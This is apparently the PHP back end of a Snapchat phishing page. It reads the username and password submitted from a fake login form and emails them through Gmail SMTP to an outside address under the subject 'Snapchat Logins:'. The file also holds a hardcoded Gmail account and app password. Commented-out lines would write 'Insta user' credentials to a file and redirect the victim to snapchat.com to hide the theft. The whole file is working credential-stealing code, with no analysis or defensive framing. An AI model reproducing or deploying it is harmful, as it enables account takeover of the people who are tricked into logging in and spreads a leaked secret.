<?php

ini_set('display_errors', '1');

$username=$_POST['username'];
$password=$_POST['password'];

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require __DIR__ .'/PHPMailer/src/Exception.php';
require __DIR__ .'/PHPMailer/src/PHPMailer.php';
require __DIR__ .'/PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);
$mail-> isSMTP();

try {
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'mrsterixmr@gmail.com';                     //SMTP username
    $mail->Password   = 'qofqwzqkitdfzutz';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('from@example.com', 'Snapchat Logins:');
    $mail->addAddress('Nikibestshark@gmail.com');     //Add a recipient


    $message = "Login: ". $username." | Password: ". $password;

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Snapchat Logins:';
    $mail->Body    = $message;
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

// $write = file_put_contents('data.txt', "Insta user: {$_POST['username']} pass: {$_POST['password']}" . PHP_EOL, FILE_APPEND);
// var_dump($write);

// header('Location: https://snapchat.com');
// exit();
?> 